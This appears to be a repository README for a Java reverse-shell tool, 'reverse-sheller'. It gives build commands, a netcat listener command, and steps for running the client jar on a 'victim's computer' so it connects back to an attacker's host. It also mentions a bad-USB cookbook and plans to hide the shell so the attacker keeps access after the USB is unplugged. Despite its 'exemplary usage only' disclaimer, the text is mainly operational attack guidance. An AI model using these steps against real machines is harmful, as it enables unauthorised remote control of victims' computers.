# reverse-sheller

## Build and execute this .jar on target machine with JDK11 or above to get a reverse shell from your host.

![Reverse shell terminal picture](imgs/reverse-shell-picture.jpg)

This repo is an example of reverse shell .jar client and server implementation.

## Table of Contents

* [Usage 💡](#usage)
* [About 💁📙](#about)
* [TODO 📝](#todo)
* [Author 👷](#author)

## Usage 💡 <a name="usage"></a>

0) Build the modules using:
-Unix cmd:
```bash
./gradlew build
```
- or Windows cmd:
```bat
.\gradlew.bat build
```
You should find executable .jar's afterwards in:
`src/client/build/libs`
`src/server/build/libs`

1) Open server waiting for client connection:
- using Netcat (check if installed):
```bash
nc -lvnp <port>
```
- or using the server .jar:
```bash
java -jar <filename.jar> <port>
```
- f.e.:
```bash
java -jar server-sheller-0.0.1.jar 4444
```
From this terminal you will be able to execute reverse shell commands:


2) Grab the `client.jar` from `./src/client/build/libs` and execute it on the victims computer using:
```bash
java -jar <filename.jar> <IP address> <port>
```
f.e.:
```bash
java -jar <filename.jar> 127.0.0.1 4444
```

And voilà!

(Requirement: JDK8 or higher needed to be installed on victim's computer, and JAVA_HOME variable needs to be 
pointing to working JDK instance)

## About 💁📙 <a name="about"></a>

This repo is an example of reverse shell .jar client and server implementation.
I redirected stdout and stdin to and from socket creating reverse shell. This repo is for exemplary usage only and
shouldn't be used for a real attack (which would be still mostly limited. This implementation so far doesn't allow
sudo and other advanced terminal functions. Only a simple cmd execution is provided).

It contains also a cookbook, how to build bad-usb and how to create your own listening server suing Cloud provider.

## TODO 📝 <a name="todo"></a>

Things that need to be done:

1) Add IaC for server deploy
2) Hide shell after execution, so that the bad-usb can be unplugged and the
process will stay connected allowing the attacker to execute code using reverse shell.
3) ...
...

![README ending picture](imgs/readme-ending-picture.jpg)

## Author 👷 <a name="author"></a>

Drop me a line at: contact.drzymala@gmail.com

sudo ssh -i "/etc/ssh/***.pem" admin@IP -vvv
export SERVER_PORT=5000
sudo apt install openjdk-11-jre-headless
sudo apt-get update
